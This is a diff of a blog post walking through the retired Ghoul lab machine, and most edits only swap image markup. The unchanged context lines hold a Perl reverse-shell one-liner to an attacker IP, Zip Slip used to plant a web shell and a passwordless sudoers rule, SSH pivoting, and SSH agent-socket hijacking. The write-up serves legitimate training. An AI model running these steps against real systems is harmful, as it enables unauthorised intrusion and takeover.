@@ -17,10 +17,10 @@ This post documents the complete walkthrough of Ghoul, a retired vulnerable [VM]
 
 <!--more-->
 
-## On this post 
-{:.no_toc} 
+## On this post
+{:.no_toc}
 
-* TOC 
+* TOC
 {:toc}
 
 ## Background
@@ -78,15 +78,15 @@ Nothing unusual. Here's what the `http` services look like.
 
 _`80/tcp`_
 
-<a class="image-popup">
-![9c634f32.png](/assets/images/posts/ghoul-htb-walkthrough/9c634f32.png)
-</a>
+
+{% include image.html image_alt="9c634f32.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/9c634f32.png" %}
+
 
 _`8080/tcp` (`admin:admin`)_
 
-<a class="image-popup">
-![a4d9ccd7.png](/assets/images/posts/ghoul-htb-walkthrough/a4d9ccd7.png)
-</a>
+
+{% include image.html image_alt="a4d9ccd7.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/a4d9ccd7.png" %}
+
 
 Looks like we have an uploader.
 
@@ -129,9 +129,9 @@ http://10.10.10.101/less (Status: 301)
 
 `secret.php` looks interesting.
 
-<a class="image-popup">
-![d818a59f.png](/assets/images/posts/ghoul-htb-walkthrough/d818a59f.png)
-</a>
+
+{% include image.html image_alt="d818a59f.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/d818a59f.png" %}
+
 
 Looks like we have a remote command/code execution (RCE) vulnerability somewhere! :triumph:
 
@@ -139,15 +139,15 @@ Looks like we have a remote command/code execution (RCE) vulnerability somewhere
 
 It's easy to miss this if you don't navigate around for a bit.
 
-<a class="image-popup">
-![9ee80aa2.png](/assets/images/posts/ghoul-htb-walkthrough/9ee80aa2.png)
-</a>
+
+{% include image.html image_alt="9ee80aa2.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/9ee80aa2.png" %}
+
 
 You can upload zip files and looks like I found where the files are uploaded to.
 
-<a class="image-popup">
-![8ce8eb48.png](/assets/images/posts/ghoul-htb-walkthrough/a36c0092.png)
-</a>
+
+{% include image.html image_alt="8ce8eb48.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/a36c0092.png" %}
+
 
 What does that tell you? The [Zip Slip Vulnerability](https://snyk.io/research/zip-slip-vulnerability)!
 
@@ -171,15 +171,15 @@ Let's zip this little bad boy.
 </pre>
 ```
 
-<a class="image-popup">
-![d970e545.png](/assets/images/posts/ghoul-htb-walkthrough/d970e545.png)
-</a>
+
+{% include image.html image_alt="d970e545.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/d970e545.png" %}
+
 
 We want to put `cmd.php` at the document root (likely to be `/var/www/html`) of `80/tcp`.
 
-<a class="image-popup">
-![4c56b9f9.png](/assets/images/posts/ghoul-htb-walkthrough/4c56b9f9.png)
-</a>
+
+{% include image.html image_alt="4c56b9f9.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/4c56b9f9.png" %}
+
 
 Bam. We have remote command execution alright.
 
@@ -193,9 +193,9 @@ perl -e 'use Socket;$i="10.10.14.11";$p=1234;socket(S,PF_INET,SOCK_STREAM,getpro
 
 It's best to `urlencode` the one-liner to prevent any complications when passing it as an URL. On my `nc` listener, a shell appears...
 
-<a class="image-popup">
-![5e81818d.png](/assets/images/posts/ghoul-htb-walkthrough/5e81818d.png)
-</a>
+
+{% include image.html image_alt="5e81818d.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/5e81818d.png" %}
+
 
 It's equally easy to [upgrade](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) the shell to a full TTY.
 
@@ -203,15 +203,15 @@ During enumeration of the `www-data` account, you'll realize that `8080/tcp` is 
 
 Here's a snippet of the output of `mount`. It has all the hallmarks of a docker container.
 
-<a class="image-popup">
-![c3b6c4ed.png](/assets/images/posts/ghoul-htb-walkthrough/c3b6c4ed.png)
-</a>
+
+{% include image.html image_alt="c3b6c4ed.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/c3b6c4ed.png" %}
+
 
 Lucky for us, `user.txt` is in this container (`aogiri`).
 
-<a class="image-popup">
-![4f8c2e77.png](/assets/images/posts/ghoul-htb-walkthrough/4f8c2e77.png)
-</a>
+
+{% include image.html image_alt="4f8c2e77.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/4f8c2e77.png" %}
+
 
 How do we become `root`? We can write a sudoers file to `/etc/sudoers.d` with Zip Slip as follows.
 
@@ -221,15 +221,15 @@ www-data ALL=(ALL) NOPASSWD:ALL
 
 It basically lets `www-data` do anything as `root` without password, including becoming `root`!
 
-<a class="image-popup">
-![90427414.png](/assets/images/posts/ghoul-htb-walkthrough/90427414.png)
-</a>
+
+{% include image.html image_alt="90427414.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/90427414.png" %}
+
 
 Well, with that we can grab all the users' SSH keys (in the event of a reset, we can use the keys to log in) as well as discover what other connections to other containers we have.
 
-<a class="image-popup">
-![8bc83904.png](/assets/images/posts/ghoul-htb-walkthrough/8bc83904.png)
-</a>
+
+{% include image.html image_alt="8bc83904.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/8bc83904.png" %}
+
 
 ### Lateral Movement
 
@@ -237,57 +237,57 @@ In order to probe other containers, we need to a few basic tools like `nc` and `
 
 We'll then slip these tools in with the Zip Slip, :smirk: or if you prefer, with `scp`.
 
-<a class="image-popup">
-![c3b6f6cd.png](/assets/images/posts/ghoul-htb-walkthrough/c3b6f6cd.png)
-</a>
 
-<a class="image-popup">
-![28d69bee.png](/assets/images/posts/ghoul-htb-walkthrough/28d69bee.png)
-</a>
+{% include image.html image_alt="c3b6f6cd.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/c3b6f6cd.png" %}
+
+
+
+{% include image.html image_alt="28d69bee.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/28d69bee.png" %}
+
 
 I think we are good to go.
 
-<a class="image-popup">
-![478e1ae5.png](/assets/images/posts/ghoul-htb-walkthrough/478e1ae5.png)
-</a>
+
+{% include image.html image_alt="478e1ae5.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/478e1ae5.png" %}
+
 
 ### Port-scan 101
 
 The first step of port-scanning is to determine your targets whether they are up or not.
 
-<a class="image-popup">
-![cf148e9f.png](/assets/images/posts/ghoul-htb-walkthrough/cf148e9f.png)
-</a>
+
+{% include image.html image_alt="cf148e9f.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/cf148e9f.png" %}
+
 
 Aogiri has an IP of `172.20.0.10/16`. Let's use the following command to `ping` the entire `/24` subnet to see who's alive.
 
-<a class="image-popup">
-![0a6ad143.png](/assets/images/posts/ghoul-htb-walkthrough/0a6ad143.png)
-</a>
+
+{% include image.html image_alt="0a6ad143.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/0a6ad143.png" %}
+
 
 Awesome, we have `172.20.0.150`. We can run a very rudimentary port scan with `nc`'s zero I/O mode like so.
 
-<a class="image-popup">
-![e90cfe37.png](/assets/images/posts/ghoul-htb-walkthrough/e90cfe37.png)
-</a>
+
+{% include image.html image_alt="e90cfe37.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/e90cfe37.png" %}
+
 
 If I had to guess, I would say that `172.20.0.150` is actually `kaneki-pc`. `kaneki` left clues in his home directory.
 
-<a class="image-popup">
-![c0678318.png](/assets/images/posts/ghoul-htb-walkthrough/c0678318.png)
-</a>
+
+{% include image.html image_alt="c0678318.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/c0678318.png" %}
+
 
 `kaneki` talks of transfering files to the server (???) using his PC.
 
-<a class="image-popup">
-![fd093e2c.png](/assets/images/posts/ghoul-htb-walkthrough/fd093e2c.png)
-</a>
+
+{% include image.html image_alt="fd093e2c.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/fd093e2c.png" %}
+
 
 Feels like [Reddish](https://hackso.me/reddish-htb-walkthrough/) all over again. Anyways, the username to `kaneki-pc` is `kaneki_pub`. The private key in `.ssh` is also password protected which makes it even more likely to be the private key for `kaneki-pc`.
 
-<a class="image-popup">
-![0628f069.png](/assets/images/posts/ghoul-htb-walkthrough/0628f069.png)
-</a>
+
+{% include image.html image_alt="0628f069.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/0628f069.png" %}
+
 
 The question now is what's the password?
 
@@ -317,9 +317,9 @@ The first argument is the key; the second argument is the attempted password. Co
 
 Well, I've tried the famed wordlist `rockyou.txt` with no luck. Then it dawned upon me that the wordlist could come from the site. Remember the secret chat group? We can use `cewl` to extract a wordlist from it.
 
-<a class="image-popup">
-![f0cc9e8a.png](/assets/images/posts/ghoul-htb-walkthrough/f0cc9e8a.png)
-</a>
+
+{% include image.html image_alt="f0cc9e8a.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/f0cc9e8a.png" %}
+
 
 Lame, I know.
 
@@ -327,39 +327,39 @@ Lame, I know.
 
 Time to test our log in.
 
-<a class="image-popup">
-![153ad0e7.png](/assets/images/posts/ghoul-htb-walkthrough/153ad0e7.png)
-</a>
+
+{% include image.html image_alt="153ad0e7.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/153ad0e7.png" %}
+
 
 Indeed! And guess what, more clues.
 
-<a class="image-popup">
-![2aa07839.png](/assets/images/posts/ghoul-htb-walkthrough/2aa07839.png)
-</a>
+
+{% include image.html image_alt="2aa07839.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/2aa07839.png" %}
+
 
 It shouldn't come as a surprise, but `kaneki-pc` is dual-homed.
 
-<a class="image-popup">
-![0e5cbd03.png](/assets/images/posts/ghoul-htb-walkthrough/0e5cbd03.png)
-</a>
+
+{% include image.html image_alt="0e5cbd03.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/0e5cbd03.png" %}
+
 
 Time to copy tools like `nc` and `socat` over with `scp`.
 
-<a class="image-popup">
-![35ec42c4.png](/assets/images/posts/ghoul-htb-walkthrough/c4661894.png)
-</a>
+
+{% include image.html image_alt="35ec42c4.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/c4661894.png" %}
+
 
 Let's repeat the port-scan steps.
 
-<a class="image-popup">
-![674af273.png](/assets/images/posts/ghoul-htb-walkthrough/674af273.png)
-</a>
+
+{% include image.html image_alt="674af273.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/674af273.png" %}
+
 
 Looks like we have another docker container at `172.18.0.2`. Let's scan with for open ports with `nc` again.
 
-<a class="image-popup">
-![11a0472e.png](/assets/images/posts/ghoul-htb-walkthrough/11a0472e.png)
-</a>
+
+{% include image.html image_alt="11a0472e.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/11a0472e.png" %}
+
 
 ### Serious Pivoting
 
@@ -385,9 +385,9 @@ _On my attacking machine_
 # ssh -D9999 -i ssh/aogiri root@10.10.10.101 -f -N
 ```
 
-<a class="image-popup">
-![843fcd3f.png](/assets/images/posts/ghoul-htb-walkthrough/843fcd3f.png)
-</a>
+
+{% include image.html image_alt="843fcd3f.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/843fcd3f.png" %}
+
 
 There you have it.
 
@@ -395,15 +395,15 @@ There you have it.
 
 `kaneki` mentioned something about Gogs in `note.txt` and something about _giving `AogiriTest` user access to Eto for git_ as well.
 
-<a class="image-popup">
-![062f99cd.png](/assets/images/posts/ghoul-htb-walkthrough/062f99cd.png)
-</a>
+
+{% include image.html image_alt="062f99cd.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/062f99cd.png" %}
+
 
 [TheZ3ro](https://github.com/TheZ3ro) wrote an awesome generic exploit tool ([`gogsownz`](https://github.com/TheZ3ro/gogsownz)) for several Gogs CVEs. In particular, Gogs 0.11.66 is susceptible to remote code execution via `git` hooks. To do that, we need credentials. That sent me on a wild goose chase for passwords. In the end, I found a commented password at `/usr/share/tomcat7/conf/tomcat-users.xml`.
 
-<a class="image-popup">
-![377b059e.png](/assets/images/posts/ghoul-htb-walkthrough/377b059e.png)
-</a>
+
+{% include image.html image_alt="377b059e.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/377b059e.png" %}
+
 
 Damn. Even using `gogsownz` need some digging into the source code. I've done my homework. Gogs configuration file is at [app.ini](https://gogs.io/docs/advanced/configuration_cheat_sheet) and the default [values](https://github.com/gogs/gogs/blob/master/conf/app.ini) can be found in the Gogs [repository](https://github.com/gogs/gogs).
 
@@ -451,33 +451,33 @@ As such, we can run `gogsownz` and put in a SSH public we control to `~/.ssh/aut
 
 Awesome. Transfer the private key to `kaneki-pc` and we should be able to gain access to the Gogs server.
 
-<a class="image-popup">
-![a2d61c22.png](/assets/images/posts/ghoul-htb-walkthrough/a2d61c22.png)
-</a>
+
+{% include image.html image_alt="a2d61c22.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/a2d61c22.png" %}
+
 
 During enumeration of `git`'s account, I noticed an unusual `setuid` executable `gosu`.
 
-<a class="image-popup">
-![2bd99e70.png](/assets/images/posts/ghoul-htb-walkthrough/2bd99e70.png)
-</a>
+
+{% include image.html image_alt="2bd99e70.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/2bd99e70.png" %}
+
 
 From the help, it appears that `gosu` is like `sudo`.
 
-<a class="image-popup">
-![69419f2a.png](/assets/images/posts/ghoul-htb-walkthrough/69419f2a.png)
-</a>
+
+{% include image.html image_alt="69419f2a.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/69419f2a.png" %}
+
 
 Let's see if we can make ourselves `root`.
 
-<a class="image-popup">
-![24125fb2.png](/assets/images/posts/ghoul-htb-walkthrough/24125fb2.png)
-</a>
+
+{% include image.html image_alt="24125fb2.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/24125fb2.png" %}
+
 
 Sweet. Check out what's in `/root`.
 
-<a class="image-popup">
-![93d4376c.png](/assets/images/posts/ghoul-htb-walkthrough/93d4376c.png)
-</a>
+
+{% include image.html image_alt="93d4376c.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/93d4376c.png" %}
+
 
 Suffice to say, I copied `aogiri-app.7z` back to my machine for further analysis.
 
@@ -485,17 +485,17 @@ Suffice to say, I copied `aogiri-app.7z` back to my machine for further analysis
 
 Diffing the commits reveal the following.
 
-<a class="image-popup">
-![69020dc3.png](/assets/images/posts/ghoul-htb-walkthrough/69020dc3.png)
-</a>
+
+{% include image.html image_alt="69020dc3.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/69020dc3.png" %}
+
 
 I tried the password on `kaneki-pc`'s `root` with no effect. It turns out that git objects kept a complete history of what was written to the file. Pretty neat stuff.
 
 All the object files are zlib compressed data.
 
-<a class="image-popup">
-![11ae6b7c.png](/assets/images/posts/ghoul-htb-walkthrough/11ae6b7c.png)
-</a>
+
+{% include image.html image_alt="11ae6b7c.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/11ae6b7c.png" %}
+
 
 As such, we can use `unpigz` to uncompress these object files to display plaintext onto `stdout` like so.
 
@@ -503,15 +503,15 @@ As such, we can use `unpigz` to uncompress these object files to display plainte
 # find . -type f -exec unpigz -c {} \; 2>/dev/null | tr -cd '[:print:]\n' | less
 ```
 
-<a class="image-popup">
-![a146c303.png](/assets/images/posts/ghoul-htb-walkthrough/a146c303.png)
-</a>
+
+{% include image.html image_alt="a146c303.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/a146c303.png" %}
+
 
 The highlighted password is the correct one to `su` as `root`. And guess what's in there? `root.txt`!
 
-<a class="image-popup">
-![29109d02.png](/assets/images/posts/ghoul-htb-walkthrough/29109d02.png)
-</a>
+
+{% include image.html image_alt="29109d02.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/29109d02.png" %}
+
 
 Damn, again. :angry:
 
@@ -519,9 +519,9 @@ Damn, again. :angry:
 
 During enumeration of `root` in `kaneki-pc`, I noticed something weird. This occurs every couple of minutes. `kaneki_adm` logs in to `kaneki-pc` only to log in to `172.18.0.1` as `root` at `2222/tcp` to execute `log.sh`.
 
-<a class="image-popup">
-![752423da.png](/assets/images/posts/ghoul-htb-walkthrough/752423da.png)
-</a>
+
+{% include image.html image_alt="752423da.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/752423da.png" %}
+
 
 It appears that SSH agent forwarding to the `docker` host is enabled on `kaneki-pc`  because that command didn't work when I tried it. Check out `/etc/ssh/ssh_config` in `kaneki-pc`.
 
@@ -592,9 +592,9 @@ Towards that end, I switched the actual `ssh` at `/usr/bin/ssh` for a "fake" `ss
 
 Check out the `PATH` environment variable.
 
-<a class="image-popup">
-![aa4719db.png](/assets/images/posts/ghoul-htb-walkthrough/aa4719db.png)
-</a>
+
+{% include image.html image_alt="aa4719db.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/aa4719db.png" %}
+
 
 Notice that `/usr/local/bin` is at a higher executable search priority than `/usr/bin`?
 
@@ -610,15 +610,15 @@ export SSH_AUTH_SOCK=$(cat /tmp/evil)
 ssh root@172.18.0.1 -p 2222
 ```
 
-<a class="image-popup">
-![8562251a.png](/assets/images/posts/ghoul-htb-walkthrough/8562251a.png)
-</a>
+
+{% include image.html image_alt="8562251a.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/8562251a.png" %}
+
 
 We are in the endgame now.
 
-<a class="image-popup">
-![19232d2a.png](/assets/images/posts/ghoul-htb-walkthrough/19232d2a.png)
-</a>
+
+{% include image.html image_alt="19232d2a.png" image_src="/f8dd83a8-2193-4ced-a27e-b9c1cb3564d3/19232d2a.png" %}
+
 
 :dancer:
 
